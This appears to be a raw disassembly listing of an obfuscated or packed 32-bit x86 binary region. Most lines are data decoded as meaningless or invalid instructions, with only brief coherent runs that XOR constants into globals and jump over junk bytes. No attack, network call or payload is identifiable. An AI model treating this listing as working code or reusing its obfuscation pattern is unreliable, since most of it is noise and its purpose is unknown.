  4059ae:	cmp    BYTE PTR [ebx+eiz*2+0x43dfa5cc],dl
  4059b5:	outs   dx,DWORD PTR ds:[esi]
  4059b6:	xchg   esi,eax
  4059b7:	out    dx,al
  4059b8:	sbb    DWORD PTR [ebx-0x6b],ebx
  4059bb:	xor    eax,0x9a940751
  4059c0:	lea    edi,[ebp-0x4e67edeb]
  4059c6:	jno    0x405a09
  4059c8:	mov    al,0x77
  4059ca:	xlat   BYTE PTR ds:[ebx]
  4059cb:	sub    dl,BYTE PTR [esi+0x2b]
  4059ce:	jo     0x405974
  4059d0:	bound  eax,QWORD PTR [edx-0x2eae138d]
  4059d6:	mov    al,0x2e
  4059d8:	mov    al,ds:0x66b6f1d7
  4059dd:	push   eax
  4059de:	ret    0xc83d
  4059e1:	or     ecx,DWORD PTR ds:0x556833aa
  4059e7:	lds    esp,FWORD PTR [edx-0x5d]
  4059ea:	ret    
  4059eb:	dec    ebp
  4059ec:	lds    esi,FWORD PTR [ebp-0x227f456e]
  4059f2:	cmp    al,0x1
  4059f4:	and    al,0x62
  4059f6:	retf   
  4059f7:	mov    edx,0x89f01d87
  4059fc:	ss popf 
  4059fe:	dec    esi
  4059ff:	in     eax,dx
  405a00:	pop    edx
  405a01:	daa    
  405a02:	cdq    
  405a03:	pop    ss
  405a04:	mov    esp,0xb8e80eae
  405a09:	lds    ecx,FWORD PTR [edi-0xd]
  405a0c:	gs add bh,ch
  405a0f:	pop    edi
  405a10:	into   
  405a11:	sbb    al,0xc3
  405a13:	pop    ecx
  405a14:	cwde   
  405a15:	in     eax,dx
  405a16:	and    bh,BYTE PTR [edi+esi*8+0x50cf0b06]
  405a1d:	adc    eax,0x65eee3f1
  405a22:	cmp    ah,BYTE PTR [edx-0x68]
  405a25:	repnz fsubr DWORD PTR [ebp-0x29]
  405a29:	mov    edx,0xd5eebcac
  405a2e:	mov    eax,0xc73ad16c
  405a33:	inc    ebp
  405a34:	cld    
  405a35:	xor    al,0x85
  405a37:	pushf  
  405a38:	clc    
  405a39:	and    DWORD PTR ds:0x43365b,edx
  405a3f:	mov    eax,DWORD PTR [ebp-0x4]
  405a42:	mov    edx,DWORD PTR ds:0x43376f
  405a48:	xor    DWORD PTR ds:0x433643,edx
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x433767,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x43363f,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43371b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43371b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43371b,ecx
  405a80:	cmp    DWORD PTR ds:0x43371b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43371b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x43367b
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x433757,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0x494d28f4,0x46b36003
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405aff
  405add:	add    esp,DWORD PTR [esp+eiz*8+0x5a]
  405ae1:	outs   dx,BYTE PTR ds:[esi]
  405ae2:	xor    BYTE PTR [ecx+0xb100aad],al
  405ae8:	leave  
  405ae9:	xchg   edx,eax
  405aea:	or     ebx,ebp
  405aec:	loope  0x405b29
  405aee:	mov    WORD PTR [ebp+0x21],es
  405af1:	aad    0xd5
  405af3:	mov    cl,0xa0
  405af5:	jp     0x405b5b
  405af7:	jnp    0x405a80
  405af9:	pop    eax
  405afa:	jae    0x405b28
  405afc:	(bad)  
  405afe:	cmp    eax,DWORD PTR [ebx+0x4d]
  405b01:	(bad)
  405b05:	data16 jl 0x405b2e
  405b08:	xlat   BYTE PTR ds:[ebx]
  405b09:	jge    0x405abd
  405b0b:	pop    edi
  405b0c:	add    DWORD PTR fs:[ebx+0x6b74222d],edx
  405b13:	jae    0x405b92
  405b15:	daa    
  405b16:	in     al,dx
  405b17:	pop    ebx
  405b18:	jo     0x405aeb
  405b1a:	pop    ds
  405b1b:	mov    ds:0x5d2b774e,eax
  405b20:	pop    eax
  405b21:	push   eax
  405b22:	shr    DWORD PTR [ecx],0xb4
  405b25:	jge    0x405b11
  405b27:	dec    esp
  405b28:	add    eax,DWORD PTR [eax+0x2c5c47bb]
  405b2e:	mov    bl,0xb4
  405b30:	mov    ds:0x96f0e246,eax
  405b35:	in     eax,0x62
  405b37:	fld    QWORD PTR [edi-0x343f3526]
  405b3d:	push   0x9b3c8bfe
  405b42:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  405b44:	arpl   WORD PTR ds:0xe7f0fbb4,di
  405b4a:	adc    esp,DWORD PTR [edi]
  405b4c:	dec    ecx
  405b4d:	push   eax
  405b4e:	mov    WORD PTR [ecx+0x6bbe64a3],cs
  405b54:	add    DWORD PTR [edi-0x36],ebp
  405b57:	out    0x0,al
  405b59:	inc    edi
  405b5a:	hlt    
  405b5b:	inc    esi
  405b5c:	loopne 0x405bca
  405b5e:	stos   BYTE PTR es:[edi],al
  405b5f:	cdq    
  405b60:	or     eax,ebx
  405b62:	stc    
  405b63:	repz sbb edi,DWORD PTR [ebp-0x2d]
  405b67:	data16 out 0x12,al
  405b6a:	std    
  405b6b:	call   0x8580:0x7faa865f
  405b72:	mov    BYTE PTR [edx],ch
  405b74:	ds out dx,al
  405b76:	or     ah,dh
  405b78:	push   esi
  405b79:	jno    0x405bd3
  405b7b:	fwait
  405b7c:	dec    eax
  405b7d:	xchg   BYTE PTR [ecx-0x7f],ch
  405b80:	pop    eax
  405b81:	(bad)  
  405b82:	frstor ds:0xaa03434b
  405b88:	jp     0x405b9f
  405b8a:	push   cs
  405b8b:	test   DWORD PTR [ecx],esp
  405b8d:	imul   ecx,DWORD PTR [esi+0x12],0xa4744d63
  405b94:	dec    ebx
  405b95:	sbb    DWORD PTR [edx+0x7a],eax
  405b98:	push   edi
  405b99:	dec    BYTE PTR [edx+0x72]
  405b9c:	jecxz  0x405b59
  405b9e:	lods   al,BYTE PTR ds:[esi]
  405b9f:	dec    ebx
  405ba0:	cwde   
  405ba1:	(bad)  [eax+eiz*4-0x52c82b27]
  405ba8:	add    bl,cl
  405baa:	jp     0x405b99
  405bac:	adc    BYTE PTR [esp+edi*2+0x58b8bffd],dh
  405bb3:	shl    DWORD PTR [ebp-0x75],1
  405bb6:	push   edx
  405bb7:	enter  0x7065,0x7c
  405bbb:	js     0x405c18
  405bbd:	xchg   ecx,eax
  405bbe:	mov    edx,0x8bdf80ff
  405bc3:	mov    cl,0x74
  405bc5:	or     DWORD PTR [ebp-0xe],ecx
  405bc8:	sbb    ebp,ebx
  405bca:	mov    WORD PTR es:[edx+ebx*4+0x2f],es
  405bcf:	test   eax,0x435f657f
  405bd4:	test   al,0x9d
  405bd6:	push   es
  405bd7:	(bad)  
  405bd8:	jle    0x405c15
  405bda:	dec    edi
  405bdb:	lock repnz enter 0xad50,0xd9
  405be1:	and    DWORD PTR [edi+0x79],esi
  405be4:	pop    eax
  405be5:	data16 (bad) 
  405be7:	xor    al,0xf
  405be9:	push   ds
  405bea:	(bad)  
  405beb:	cmp    DWORD PTR [eax+0x1c9482be],esp
  405bf1:	cli    
  405bf2:	xor    ch,ah
  405bf4:	fwait
  405bf5:	ror    BYTE PTR [eax+0x6a91f79e],cl
  405bfb:	dec    esp
  405bfc:	fdiv   DWORD PTR [ecx]
  405bfe:	(bad)  
  405c00:	pop    edi
  405c01:	mov    ah,0xac
  405c03:	xor    al,0x4a
  405c05:	add    BYTE PTR [edx+0x2e],bl
  405c08:	cmc    
  405c09:	out    0xa4,al
  405c0b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c0d:	mov    eax,0x5d7ebe8f
  405c12:	sar    DWORD PTR [esi+eiz*4+0x69],cl
  405c16:	xchg   edx,eax
  405c17:	push   esp
  405c18:	not    DWORD PTR [ebp+0x43f08b08]
  405c1e:	(bad)  
  405c1f:	fisttp QWORD PTR [ebx+0x5b7ef2b7]
  405c25:	mov    eax,ds:0xef4457ba
  405c2a:	fwait
  405c2b:	xchg   ebp,eax
  405c2c:	ror    DWORD PTR [ecx-0x72],cl
  405c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c30:	(bad)  
  405c31:	hlt    
  405c32:	pop    ebx
  405c33:	js     0x405cb3
  405c35:	mov    bh,0xf5
  405c37:	cli    
  405c38:	mov    ecx,0xba1fc2ef
  405c3d:	jmp    0xa06826c0
  405c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c43:	push   esi
  405c45:	dec    edx
  405c46:	push   0xffffffe2
  405c48:	push   edi
  405c49:	jo     0x405c19
  405c4b:	and    bl,BYTE PTR [ecx-0x5e]
  405c4e:	mov    al,0xf2
  405c50:	hlt    
  405c51:	jmp    0x2a96:0x301b4620
  405c58:	inc    esi
  405c59:	dec    ecx
  405c5a:	pop    edi
  405c5b:	xlat   BYTE PTR ds:[ebx]
  405c5c:	lds    ecx,FWORD PTR [eax+eax*2]
  405c5f:	jb     0x405c5a
  405c61:	pop    ds
  405c62:	xchg   esi,eax
  405c63:	shr    cl,1
  405c65:	adc    ah,BYTE PTR [edi]
  405c67:	outs   dx,BYTE PTR ds:[esi]
  405c68:	sti    
  405c69:	sub    al,0x92
  405c6b:	push   0xffffffe9
  405c6d:	jle    0x405cc5
  405c6f:	jl     0x405c38
  405c71:	aas    
  405c72:	add    eax,0x3a9a360c
  405c77:	sub    al,0xd5
  405c79:	pop    esi
  405c7a:	add    edx,ebx
  405c7c:	clc    
  405c7d:	cld    
  405c7e:	jbe    0x405ceb
  405c80:	add    cl,BYTE PTR [edi]
  405c82:	shr    BYTE PTR [ecx],0x25
  405c85:	iret   
  405c86:	adc    al,0x72
  405c88:	xor    DWORD PTR [ebp+0x24],edi
  405c8b:	jne    0x405c96
  405c8d:	dec    edi
  405c8e:	jnp    0x405c30
  405c90:	aad    0xdf
  405c92:	sbb    BYTE PTR [eax],bh
  405c94:	inc    eax
  405c95:	dec    edi
  405c96:	pop    ds
  405c97:	es out dx,eax
  405c99:	cmp    ecx,DWORD PTR [edi+0x6780a5a7]
  405c9f:	pop    eax
  405ca0:	xchg   ebp,eax
  405ca1:	test   DWORD PTR [edi-0x6],esi
  405ca4:	cmp    ah,BYTE PTR [edx+0x54450b97]
  405caa:	mov    cl,0xc2
  405cac:	pop    ds
  405cad:	int3   
  405cae:	out    0xf1,eax
  405cb0:	call   0xa779:0x30fb1ba8
  405cb7:	xchg   esi,eax
  405cb8:	mov    dl,0x38
  405cba:	lods   al,BYTE PTR ds:[esi]
  405cbb:	je     0x405d0a
  405cbd:	xchg   ebx,eax
  405cbe:	mov    edi,esi
  405cc0:	leave  
  405cc1:	daa    
  405cc2:	mov    ebp,0x6554f42a
  405cc7:	and    DWORD PTR [eax-0x3a],esi
  405cca:	or     eax,0x729f1576
  405ccf:	daa    
  405cd0:	cmp    DWORD PTR [esi],edi
  405cd2:	stc    
  405cd3:	xor    BYTE PTR [ebp+0x4b],ah
  405cd6:	stos   DWORD PTR es:[edi],eax
  405cd7:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cd9:	pop    eax
  405cda:	stos   DWORD PTR es:[edi],eax
  405cdb:	ins    DWORD PTR es:[edi],dx
  405cdc:	jle    0x405d0d
  405cde:	neg    BYTE PTR [esi]
  405ce0:	cdq    
  405ce1:	mov    bh,0xc8
  405ce3:	fs mov al,0x64
  405ce6:	sbb    ch,BYTE PTR [esp+eiz*8]
  405ce9:	inc    edx
  405cea:	jg     0x405d02
  405cec:	(bad)  
  405ced:	cwde   
  405cee:	dec    edi
  405cef:	leave  
  405cf0:	lahf   
  405cf1:	dec    edi
  405cf2:	call   0xf0a6:0x30da77e9
  405cf9:	bound  esi,QWORD PTR cs:[ecx+0x5f]
  405cfd:	xlat   BYTE PTR ds:[ebx]
  405cfe:	sar    BYTE PTR ds:0x79a9041c,1
  405d04:	pop    ebp
  405d05:	call   0xa8ee:0x6203c9b8
  405d0c:	jno    0x405d16
  405d0e:	ret    
  405d0f:	cmp    DWORD PTR [esi+ecx*2-0x63],0x8c7e6252
  405d17:	int    0xa6
  405d19:	cld    
  405d1a:	cwde   
  405d1b:	adc    al,0xdc
  405d1d:	mov    DWORD PTR [ebp+0xa],ecx
  405d20:	and    al,0xdf
  405d22:	ficomp DWORD PTR [eax+0x73]
  405d25:	adc    al,BYTE PTR [eax+ecx*2]
  405d28:	sbb    eax,0x1c9ad26a
  405d2d:	aam    0xb6
  405d2f:	lods   al,BYTE PTR ds:[esi]
  405d30:	imul   edx,DWORD PTR [edx],0x299ce82a
  405d36:	and    al,0x25
  405d38:	and    al,0x87
  405d3a:	iret   
  405d3b:	stc    
  405d3c:	push   ebx
  405d3d:	push   es
  405d3e:	jl     0x405cfd
  405d40:	jmp    0x8844:0xd7fd84a7
  405d47:	adc    BYTE PTR [edi-0x3145d89d],bh
  405d4d:	pop    ebp
  405d4e:	inc    edi
  405d4f:	fidivr WORD PTR [eax-0x1e]
  405d52:	clc    
  405d53:	xor    al,0x10
  405d55:	push   esi
  405d56:	mov    al,0xf7
  405d58:	pop    ds
  405d59:	sar    edi,cl
  405d5b:	push   ebx
  405d5c:	fadd   st(3),st
  405d5e:	rcr    DWORD PTR [ecx+0x28a22555],1
  405d64:	push   ebp
  405d65:	and    BYTE PTR [eax-0x5695e252],ch
  405d6b:	jmp    0xf27e:0xa5756026
  405d72:	pop    edx
  405d73:	arpl   WORD PTR [ecx+0x14],di
  405d76:	jo     0x405d49
  405d78:	push   edx
  405d79:	xor    DWORD PTR [edx+0x2be5c308],0x6a4acca3
  405d83:	and    eax,0x5c9898d3
  405d88:	push   edx
  405d89:	rcr    DWORD PTR [edx-0x79],0x94
  405d8d:	sbb    eax,DWORD PTR [ecx]
  405d8f:	mov    ecx,0xe824aea8
  405d94:	fild   WORD PTR [edi]
  405d96:	xor    esi,DWORD PTR [edx]
  405d98:	or     al,0x35
  405d9a:	test   BYTE PTR [ecx+0x21],dh
  405d9d:	js     0x405e02
  405d9f:	cmp    ecx,esp
  405da1:	stos   DWORD PTR es:[edi],eax
  405da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405da3:	xor    eax,0x4bb4a20d
  405da8:	leave  
  405da9:	jne    0x405d65
  405dab:	mov    eax,ds:0xc9383bad
  405db0:	push   edi
  405db1:	ja     0x405dc6
  405db3:	in     eax,0xa9
  405db5:	fist   WORD PTR [ebx]
  405db7:	jne    0x405dfe
  405db9:	test   eax,0xe562e75b
  405dbe:	clc    
  405dbf:	pop    ds
  405dc0:	mov    ebx,0x693ffbaa
  405dc5:	test   DWORD PTR [edx+0x24ce15de],ebx
  405dcb:	mov    al,ds:0x3d02af64
  405dd0:	aaa    
  405dd1:	out    0x55,al
  405dd3:	lods   eax,DWORD PTR ds:[esi]
  405dd4:	and    al,0x5
  405dd6:	lock mov eax,ds:0xf6856a64
  405ddc:	pop    es
  405ddd:	push   0xffffffeb
  405ddf:	leave  
  405de0:	les    esp,FWORD PTR [edi+0x58]
  405de3:	push   fs
  405de5:	jmp    0x6adc:0x32c1d5e
  405dec:	bound  ecx,QWORD PTR [eax+0x56]
  405def:	sbb    BYTE PTR [ebp-0x5d],cl
  405df2:	and    bh,bl
  405df4:	sbb    BYTE PTR [eax],al
  405df6:	add    bh,dh
  405df8:	popf   
  405df9:	cmp    eax,0xcbd21d68
  405dfe:	push   es
  405dff:	(bad)  
  405e00:	sub    dl,BYTE PTR [ebx+0x5baeb469]
  405e06:	mov    ds:0x403ef260,al
  405e0b:	inc    ebp
  405e0c:	and    dh,BYTE PTR [esi]
  405e0e:	out    0x84,al
  405e10:	fwait
  405e11:	dec    esi
  405e12:	cmp    esp,ecx
  405e14:	(bad)  
  405e15:	fs jle 0x405e5e
  405e18:	stos   BYTE PTR es:[edi],al
  405e19:	lds    eax,FWORD PTR [edi]
  405e1b:	push   esi
  405e1c:	jne    0x405dc3
  405e1e:	in     al,0x3e
  405e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e21:	lods   al,BYTE PTR ds:[esi]
  405e22:	and    DWORD PTR [edx+0x3342c7ee],0x34
  405e29:	loopne 0x405e00
  405e2b:	cmp    ebp,DWORD PTR [ebx+ecx*8]
  405e2e:	jp     0x405e82
  405e30:	jp     0x405e9d
  405e32:	push   edx
  405e33:	lods   al,BYTE PTR ds:[esi]
  405e34:	mov    al,BYTE PTR [edx+eiz*2+0x36]
  405e38:	xor    BYTE PTR [ecx],dl
  405e3a:	out    dx,al
  405e3b:	lahf   
  405e3c:	pop    esp
  405e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e3e:	and    edi,esi
  405e40:	push   ss
  405e41:	add    BYTE PTR [edx],0xbb
  405e44:	xor    eax,0x855f359d
  405e49:	inc    esp
  405e4a:	fcomip st,st(0)
  405e4c:	adc    DWORD PTR [eax],ebx
  405e4e:	push   eax
  405e4f:	add    esi,ecx
  405e51:	aam    0x2a
  405e53:	sar    BYTE PTR [edi-0x1d],0x78
  405e57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e58:	bound  edi,QWORD PTR [esi]
  405e5a:	dec    ebx
  405e5b:	ds inc esp
  405e5d:	and    esi,DWORD PTR [edx]
  405e5f:	(bad)  
  405e60:	and    DWORD PTR [edi+edi*2],ecx
  405e63:	jmp    0x405df6
  405e65:	push   esi
  405e66:	imul   esi,DWORD PTR [ebx+0x79],0xffffffb8
  405e6a:	dec    esp
  405e6b:	test   dl,ah
  405e6d:	xchg   edx,eax
  405e6e:	sbb    al,0xd9
  405e70:	in     al,0x1
  405e72:	and    DWORD PTR [eax],ebp
  405e74:	xor    DWORD PTR [eax-0x128c40cf],0xe7a23fcd
  405e7e:	sub    eax,0xc4c3f945
  405e83:	mov    esp,ecx
  405e85:	dec    eax
  405e86:	repz mov edx,0xf651140e
  405e8c:	xchg   esi,eax
  405e8d:	pop    edx
  405e8e:	js     0x405e64
  405e90:	in     al,dx
  405e91:	popa   
  405e92:	jns    0x405e97
  405e94:	ror    DWORD PTR [edi],0xaf
  405e97:	(bad)  
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0x2b3c6b45
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	rcr    BYTE PTR [edx],0x75
  405ee5:	les    edx,FWORD PTR [edi]
  405ee7:	xor    DWORD PTR [eax+0x68],0x6b0bf5ed
  405eee:	adc    BYTE PTR [edi-0x69],cl
  405ef1:	imul   bl
  405ef3:	cs out dx,al
  405ef5:	push   eax
  405ef6:	push   ds
  405ef7:	add    edx,DWORD PTR [bx+si-0xae5]
  405efc:	jae    0x405ed5
  405efe:	add    DWORD PTR [edx-0x2f],edi
  405f01:	call   DWORD PTR [eax-0x7e6ceffe]
  405f07:	or     al,0xcc
  405f09:	xor    BYTE PTR [edx+0x6b],bl
  405f0c:	jns    0x405f6a
  405f0e:	aad    0x82
  405f10:	loope  0x405f80
  405f12:	pushf  
  405f13:	enter  0x4d0c,0xfb
  405f17:	fcom   QWORD PTR [ebp-0x5a997446]
  405f1d:	push   ds
  405f1e:	mov    ch,BYTE PTR [ebx-0x5019ec79]
  405f24:	icebp  
  405f25:	push   es
  405f26:	push   ss
  405f27:	jo     0x405ec8
  405f29:	in     al,0xbd
  405f2b:	fld    QWORD PTR [edi+edx*4+0x5ba0db74]
  405f32:	sbb    cl,ch
  405f34:	push   ss
  405f35:	lahf   
  405f36:	daa    
  405f37:	in     eax,dx
  405f38:	xor    esp,DWORD PTR [ebx+0x5bc7a6fd]
  405f3e:	call   0xc89d4724
  405f43:	adc    al,0xd5
  405f45:	(bad)  
  405f47:	lods   al,BYTE PTR ds:[esi]
  405f48:	sub    cl,bh
  405f4a:	inc    esp
  405f4b:	dec    eax
  405f4c:	xor    ecx,DWORD PTR [esi]
  405f4e:	jle    0x405f0f
  405f50:	(bad)  
  405f51:	into   
  405f52:	lock inc ebp
  405f54:	push   ebx
  405f55:	and    bh,bh
  405f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f58:	add    al,0x4c
  405f5a:	sbb    esp,eax
  405f5c:	jmp    0x405f4e
  405f5e:	pusha  
  405f5f:	mov    edx,ebx
  405f61:	push   0xe4bb4638
  405f66:	sub    ebp,DWORD PTR [edx+eiz*4]
  405f69:	push   esp
  405f6a:	in     al,dx
  405f6b:	cmp    DWORD PTR [eax-0x74783f7c],edx
  405f71:	ds dec ecx
  405f73:	jns    0x405f63
  405f75:	cld    
  405f76:	outs   dx,BYTE PTR ds:[esi]
  405f77:	bound  ebx,QWORD PTR [esi+0x3e]
  405f7a:	inc    edi
  405f7b:	adc    al,0x9d
  405f7d:	retf   0xb5d0
  405f80:	enter  0x4633,0x42
  405f84:	push   ebp
  405f85:	sahf   
  405f86:	mov    BYTE PTR [ebx],bh
  405f88:	lea    esp,[ebp-0x684e4dc9]
  405f8e:	dec    ebx
  405f8f:	sbb    edx,esi
  405f91:	int3   
  405f92:	dec    ebx
  405f93:	rcl    DWORD PTR ds:0x757bed1d,cl
  405f99:	inc    ebp
  405f9a:	xlat   BYTE PTR ds:[ebx]
  405f9b:	cld    
  405f9c:	(bad)  
  405f9d:	retf   
  405f9e:	sbb    ch,al
  405fa0:	sub    eax,0x66488f63
  405fa5:	pop    edx
  405fa6:	imul   ecx,edi,0xc340fe03
  405fac:	jae    0x405f4d
  405fae:	mov    eax,ds:0xcc366b16
  405fb3:	mov    ah,0xc6
  405fb5:	jb     0x405f9b
  405fb7:	xchg   BYTE PTR [ebx],ch
  405fb9:	mov    ebx,0xa6c79847
  405fbe:	or     eax,0xf2897376
  405fc3:	enter  0x33ce,0x30
  405fc7:	xchg   ecx,eax
  405fc8:	cmc    
  405fc9:	sbb    al,0x36
  405fcb:	in     al,dx
  405fcc:	cmp    cl,dl
  405fce:	adc    al,0x16
  405fd0:	dec    edi
  405fd1:	jns    0x405fb2
  405fd3:	cmp    eax,0x310eed57
  405fd8:	xor    edi,edi
  405fda:	add    al,0x66
  405fdc:	push   ds
  405fdd:	je     0x405f66
  405fdf:	lds    ebp,FWORD PTR [ecx+0x29]
  405fe2:	adc    eax,0x999cadc7
  405fe7:	fs cmp al,0xf2
  405fea:	sub    DWORD PTR [eax],0xffffffbd
  405fed:	sub    al,0x94
  405fef:	add    eax,edx
  405ff1:	jns    0x406042
  405ff3:	(bad)  
  405ff5:	cli    
  405ff6:	not    dl
  405ff8:	mov    eax,DWORD PTR [edx-0x35bc0543]
  405ffe:	pop    esp
  405fff:	cmp    edi,DWORD PTR [ecx+edx*4+0x7ced3862]
  406006:	pop    edx
  406007:	retf   
  406008:	popf   
  406009:	sbb    al,0x99
  40600b:	out    0xd9,eax
  40600d:	jns    0x406018
  40600f:	(bad)  
  406010:	jmp    0xe7a3fdfb
  406015:	ret    0x20f4
  406018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406019:	mov    edi,0xa6c4391d
  40601e:	dec    eax
  40601f:	jp     0x40600e
  406021:	adc    BYTE PTR [ebp-0x69],dl
  406024:	mov    cl,0x56
  406026:	mov    bl,0x3f
  406028:	push   edi
  406029:	aaa    
  40602a:	imul   edx,DWORD PTR [ecx+esi*2-0x67],0x5e
  40602f:	xchg   edi,eax
  406030:	or     al,0x53
  406032:	fwait
  406033:	jmp    0x8abbff2d
  406038:	and    DWORD PTR [edi-0x2b4f6a9b],ebx
  40603e:	sub    dl,BYTE PTR [ebp-0x1f]
  406041:	clc    
  406042:	push   ss
  406043:	out    dx,al
  406044:	aam    0x16
  406046:	inc    ecx
  406047:	enter  0x5f10,0xdb
  40604b:	(bad)  
  40604c:	std    
  40604d:	outs   dx,DWORD PTR ds:[esi]
  40604e:	jmp    0x8e1a:0xa973365e
  406055:	xchg   DWORD PTR [edx],eax
  406057:	ret    
  406058:	es hlt 
  40605a:	arpl   WORD PTR [ecx-0x49],si
  40605d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40605e:	sbb    esi,DWORD PTR [edi-0x82bea66]
  406064:	loope  0x40607d
  406066:	push   cs
  406067:	fisttp WORD PTR [edi-0x1d]
  40606a:	dec    ecx
  40606b:	mov    al,ds:0x95ec7675
  406070:	xor    edi,DWORD PTR [ecx-0x109dae8e]
  406076:	je     0x40604d
  406078:	jmp    0x4060bd
  40607a:	fidivr WORD PTR [ebx+0x63]
  40607d:	adc    ch,bh
  40607f:	xchg   ebx,eax
  406080:	cdq    
  406081:	push   0x9eec4bd1
  406086:	adc    al,0x2c
  406088:	jmp    0x2dc6506d
  40608d:	cmp    al,BYTE PTR [ebx+0x2f121f0c]
  406093:	push   es
  406094:	and    al,0xa9
  406096:	outs   dx,BYTE PTR ds:[esi]
  406097:	mov    edx,0x27459d0c
  40609c:	outs   dx,DWORD PTR ds:[esi]
  40609d:	xor    esp,ebp
  40609f:	mov    ch,0x66
  4060a1:	bound  ebx,QWORD PTR ss:[ebx+0x5e]
  4060a5:	mov    ebx,0xb7a499cb
  4060aa:	and    edx,DWORD PTR [ebp+eiz*2-0x61]
  4060ae:	push   ecx
  4060af:	pop    ecx
  4060b0:	mov    DWORD PTR [ebx+0x7c],ebx
  4060b3:	scas   eax,DWORD PTR es:[edi]
  4060b4:	mov    al,0x1c
  4060b6:	int3   
  4060b7:	(bad)  
  4060b8:	jge    0x406127
  4060ba:	fiadd  DWORD PTR [esi-0x30]
  4060bd:	(bad)  
  4060be:	ins    BYTE PTR es:[edi],dx
  4060bf:	ja     0x40612d
  4060c1:	arpl   WORD PTR [ebx+eiz*2-0x54cb4ff0],si
  4060c8:	aad    0xe7
  4060ca:	in     eax,0x8f
  4060cc:	pop    ds
  4060cd:	or     eax,ecx
  4060cf:	adc    DWORD PTR [eax-0x24ff6208],edi
  4060d5:	stc    
  4060d6:	inc    esp
  4060d7:	or     bh,ah
  4060d9:	sub    al,0xc2
  4060db:	stc    
  4060dc:	mov    fs,WORD PTR [ecx-0x5ddce5fe]
  4060e2:	pop    esp
  4060e3:	mov    edx,0x3a6e716f
  4060e8:	jg     0x4060ff
  4060ea:	dec    esi
  4060eb:	stc    
  4060ec:	sbb    ebx,ecx
  4060ee:	out    dx,eax
  4060ef:	scas   eax,DWORD PTR es:[edi]
  4060f0:	imul   esp,DWORD PTR [edi-0x3b],0x7954c261
  4060f7:	ja     0x40615b
  4060f9:	pop    ss
  4060fa:	pop    ds
  4060fb:	sti    
  4060fc:	push   0x34
  4060fe:	cmp    BYTE PTR [ebx],0x17
  406101:	xchg   ebx,eax
  406102:	pop    esp
  406103:	sbb    DWORD PTR [ebp+0x2943c6be],esi
  406109:	sbb    eax,0xa239cefd
  40610e:	push   ebx
  40610f:	jp     0x406149
  406111:	push   esp
  406112:	ret    
  406113:	lea    edx,[di]
  406116:	pop    ds
  406117:	icebp  
  406118:	mov    cl,0xcc
  40611b:	jno    0x4060e0
  40611d:	jb     0x40613a
  40611f:	in     eax,0x72
  406121:	leave  
  406122:	xor    edx,eax
  406124:	xchg   BYTE PTR [ebx-0x54],dl
  406127:	push   0xa3715ef2
  40612c:	or     DWORD PTR [edx-0x32],ecx
  40612f:	inc    eax
  406130:	adc    eax,0xd2c43155
  406135:	or     esi,eax
  406137:	ja     0x406101
  406139:	mov    ebp,0x9aa1bea6
  40613e:	int3   
  40613f:	sahf   
  406140:	fwait
  406141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406142:	jl     0x406148
  406144:	ds pop edi
  406146:	or     BYTE PTR [eax-0x78],bl
  406149:	dec    esi
  40614a:	lods   al,BYTE PTR ds:[esi]
  40614b:	mov    esp,0xfee8fa03
  406150:	xor    eax,0x5b5e7603
  406155:	in     eax,0x8d
  406157:	lahf   
  406158:	xchg   esp,eax
  406159:	push   0x508e4c71
  40615e:	and    al,0x4a
  406160:	jbe    0x406143
  406162:	mov    eax,ds:0x36e727e0
  406167:	or     al,0x53
  406169:	jmp    0x4060f2
  40616b:	hlt    
  40616c:	add    eax,0x587f07
  406171:	lock test dl,bh
